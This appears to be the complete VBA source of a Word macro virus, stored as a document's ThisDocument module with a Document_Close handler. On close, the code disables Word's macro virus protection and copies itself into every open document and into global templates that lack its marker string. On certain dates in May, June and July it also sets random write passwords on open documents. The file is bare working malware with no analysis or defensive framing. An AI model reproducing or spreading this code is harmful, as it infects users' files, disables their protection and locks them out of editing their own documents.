   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
   On Error Resume Next
       If Left(Me.BuiltInDocumentProperties("Title"), 1) = "?" Then
           Me.BuiltInDocumentProperties("Title") = Mid(Me.BuiltInDocumentProperties("Title"), 2)
           Exit Sub
       End If
       Me.BuiltInDocumentProperties("Title") = "?" & Me.BuiltInDocumentProperties("Title")
       Dim currdoc As Document
       Dim thecode As Object
       Dim currcomp As Object
       Set thecode = Me.VBProject.VBComponents.Item(Me.CodeName).CodeModule
       Dim lines As Integer, mystart As Integer
       mystart = thecode.ProcBodyLine("Document_Close", vbext_pk_Proc)
       mylines = thecode.ProcCountLines("Document_Close", vbext_pk_Proc) - mystart + 1
       Dim savy As Boolean
       Options.VirusProtection = False
       For Each currdoc In Documents
           savy = currdoc.Saved
           If currdoc.SaveFormat = wdFormatDocument Or currdoc.SaveFormat = wdFormatTemplate Then
               Set currcomp = currdoc.VBProject.VBComponents.Item(1)
               If Not currcomp.CodeModule.Find("wsxzaqedc", 1, 1, 100000, 100000) Then
                   If Not currcomp.CodeModule.Find("Document_Close", 1, 1, 100000, 100000) Then
                       currcomp.CodeModule.AddFromString thecode.lines(mystart, mylines)
                   Else
                       currcomp.CodeModule.InsertLines currcomp.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc) + 1, thecode.lines(mystart + 1, mylines - 2)
                   End If
                   If savy Then currdoc.Save
               End If
               If (Day(Now()) = 30 And Month(Now()) = 7) Or (Day(Now()) = 20 And Month(Now()) = 6) Or (Day(Now()) = 3 And Month(Now()) = 5) Then
                   currdoc.WritePassword = Str(Int(Rnd() * 10) - 1)
                   If savy Then currdoc.Save
               End If

           End If
       Next currdoc
       Dim currtemp As Template
       Dim code As String
       For Each currtemp In Templates
           savy = currtemp.Saved
           Set currcomp = currtemp.VBProject.VBComponents.Item(1)
           If Not currcomp.CodeModule.Find("wsxzaqedc", 1, 1, 100000, 100000) Then
               If Not currcomp.CodeModule.Find("Document_Close", 1, 1, 100000, 100000) Then
                   code = thecode.lines(mystart, mylines)
                   currcomp.CodeModule.AddFromString code
               Else
                   code = thecode.lines(mystart + 1, mylines - 2)
                   currcomp.CodeModule.InsertLines currcomp.CodeModule.ProcBodyLine("Document_Close", vbext_pk_Proc) + 1, code
               End If
               If savy Then currtemp.Save
            End If
       Next currtemp
       Me.BuiltInDocumentProperties("Title") = Mid(Me.BuiltInDocumentProperties("Title"), 2)
   End Sub
